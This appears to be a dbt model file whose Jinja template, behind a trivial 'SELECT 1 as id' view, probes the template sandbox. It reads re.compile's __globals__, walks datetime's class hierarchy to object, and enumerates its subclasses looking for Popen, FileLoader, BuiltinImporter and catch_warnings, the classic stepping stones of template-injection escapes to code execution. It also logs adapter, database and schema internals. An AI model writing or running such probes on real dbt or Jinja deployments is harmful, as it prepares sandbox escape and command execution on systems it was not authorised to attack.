{{ config(materialized='view') }}
{%- set re_mod = modules.re -%}
{{ log("RE_COMPILE_TYPE=" ~ re_mod.compile | string, info=True) }}

{%- set gg = re_mod.compile | attr('__globals__') -%}
{{ log("RE_GLOBALS=" ~ gg | string | truncate(500), info=True) if gg else log("RE_GLOBALS=NONE", info=True) }}

{{ log("LIPSUM=" ~ lipsum | string, info=True) if lipsum is defined else log("LIPSUM_UNDEF", info=True) }}
{{ log("CYCLER=" ~ cycler | string, info=True) if cycler is defined else log("CYCLER_UNDEF", info=True) }}
{{ log("NAMESPACE=" ~ namespace | string, info=True) if namespace is defined else log("NAMESPACE_UNDEF", info=True) }}

{{ log("ADAPTER=" ~ adapter | string | truncate(200), info=True) }}
{{ log("STATEMENT=" ~ statement | string, info=True) }}
{{ log("EXCEPTIONS=" ~ exceptions | string | truncate(200), info=True) }}
{{ log("DATABASE=" ~ database, info=True) }}
{{ log("SCHEMA=" ~ schema, info=True) }}

{% set dt = modules.datetime %}
{% set dt_class = dt.datetime %}
{% set mro = dt_class.__mro__ %}
{{ log("MRO_LEN=" ~ (mro | length), info=True) }}
{% for m in mro %}
{{ log("MRO_" ~ loop.index ~ "=" ~ (m | string), info=True) }}
{% endfor %}

{% set obj = dt_class.__mro__[-1] %}
{% set subs = obj.__subclasses__() %}
{{ log("SUBCLASSES_COUNT=" ~ (subs | length), info=True) }}
{% for s in subs %}
{% if 'warning' in (s | string | lower) or 'Popen' in (s | string) or 'FileLoader' in (s | string) or 'BuiltinImporter' in (s | string) or 'catch_warnings' in (s | string) %}
{{ log("INTERESTING_SUB_" ~ loop.index ~ "=" ~ (s | string), info=True) }}
{% endif %}
{% endfor %}

SELECT 1 as id
